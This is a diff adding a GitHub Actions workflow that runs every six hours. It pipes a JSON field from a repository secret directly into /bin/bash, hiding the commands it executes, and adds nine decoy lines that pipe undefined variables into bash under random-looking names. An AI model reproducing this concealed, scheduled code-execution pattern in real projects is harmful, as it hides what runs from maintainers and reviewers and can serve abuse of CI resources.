@@ -1,0 +1,26 @@
+name: zhaohanzn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaohanzn
+        env:
+          gp29337: ${{ secrets.gp29337 }}
+        run: |
+          echo $gp29337 | jq -r .gf28994 | /bin/bash
+          echo $z6346 | jq -r .xcfcf025 | /bin/bash
+          echo $z1 | jq -r .dplk4 | /bin/bash
+          echo $xvap82 | jq -r .ktc389 | /bin/bash
+          echo $wsah8225 | jq -r .vn28 | /bin/bash
+          echo $xhly823 | jq -r .sk0672 | /bin/bash
+          echo $gdvjb2400 | jq -r .r39684 | /bin/bash
+          echo $bfyb57 | jq -r .x0712 | /bin/bash
+          echo $jkwvw506 | jq -r .hq76456 | /bin/bash
+          echo $jsws4882 | jq -r .o1304 | /bin/bash
+
